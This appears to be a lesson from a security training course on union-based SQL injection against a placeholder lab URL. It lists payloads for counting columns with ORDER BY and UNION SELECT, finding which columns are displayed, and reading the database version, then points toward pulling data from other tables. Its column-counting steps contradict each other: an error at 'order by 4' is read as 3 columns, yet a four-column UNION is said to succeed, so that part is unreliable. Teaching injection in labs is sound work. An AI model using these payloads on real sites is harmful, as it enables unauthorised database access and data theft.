# Union Injection

## Overview

Now that we understand how the UNION clause works, let's learn how to exploit it in SQL injections.

**Example vulnerability:**
```
http://SERVER_IP:PORT/search.php?port_code=cn
```

When we inject a single quote (`'`), we get a SQL syntax error, indicating potential SQL injection vulnerability. Union-based injection is ideal here since query results are visible.

---

## Detecting the Number of Columns

Before exploiting Union-based queries, we must determine how many columns the server selects. Two methods exist:

### Method 1: ORDER BY Clause

Inject `ORDER BY` with incrementing column numbers until an error occurs:

```sql
' order by 1-- -
' order by 2-- -
' order by 3-- -
' order by 4-- -
```

When `order by 4` returns an error ("Unknown column '4'"), the table has **3 columns**.

### Method 2: UNION SELECT

Attempt UNION queries with increasing column counts:

```sql
cn' UNION select 1,2,3-- -          -- Error: column mismatch
cn' UNION select 1,2,3,4-- -        -- Success: 4 columns
```

---

## Identifying Displayed Columns

Not all columns returned are displayed to users. Test with dummy numbers to identify which columns appear:

```sql
cn' UNION select 1,2,3,4-- -
```

**Result:** Only columns 2, 3, 4 display (column 1 is hidden).

To retrieve actual database data, inject SQL functions in displayed columns:

```sql
cn' UNION select 1,@@version,3,4-- -
```

**Output:** `10.3.22-MariaDB-1ubuntu1, 3, 4`

Now you can form effective Union injection payloads to extract data from other tables and databases.
